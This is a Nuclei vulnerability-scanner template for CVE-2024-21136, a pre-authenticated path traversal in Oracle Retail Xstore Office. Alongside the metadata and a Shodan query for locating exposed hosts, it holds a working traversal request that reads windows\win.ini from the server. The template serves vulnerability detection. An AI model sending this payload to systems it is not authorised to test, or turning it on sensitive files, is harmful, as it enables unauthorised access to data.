id: CVE-2024-21136

info:
  name: Oracle Retail Xstore Suite - Pre-authenticated Path Traversal
  author: DhiyaneshDk
  severity: high
  description: |
    Vulnerability in the Oracle Retail Xstore Office product of Oracle Retail Applications (component: Security). Supported versions that are affected are 19.0.5, 20.0.3, 20.0.4, 22.0.0 and 23.0.1. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Retail Xstore Office. While the vulnerability is in Oracle Retail Xstore Office, attacks may significantly impact additional products (scope change).
  remediation: |
    Apply the latest security patches and updates from the vendor to address this vulnerability.
  impact: |
    Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Oracle Retail Xstore Office accessible data.
  reference:
    - https://www.oracle.com/security-alerts/cpuapr2024.html
    - https://www.synacktiv.com/en/advisories/oracle-retail-xstore-suite-pre-authenticated-path-traversal
    - https://nvd.nist.gov/vuln/detail/CVE-2024-21136
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 8.6
    cve-id: CVE-2024-21136
    epss-score: 0.42062
    epss-percentile: 0.97319
    cpe: cpe:2.3:a:oracle:retail_xstore_office:19.0.5:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: oracle
    product: retail_xstore_office
    shodan-query: html:"xstoremgwt"
  tags: cve,cve2024,oracle,xstore,lfi,vkev,vuln

http:
  - raw:
      - |
        GET /xstoremgwt/cheetahImages?imageId=..\..\..\..\windows\win.ini HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'for 16-bit app support'
          - '[fonts]'
        condition: and

      - type: status
        status:
          - 200
# digest: 480a0045304302207c1abcee68c3e9cb3ac648d28d2fb17153660377993617dc9a593107233793f4021f221184a1fccfd49b3993b9a38337b2b92b81552e29969ba3f2fef9f6bb281a:922c64590222798bb761d5b6d8e72950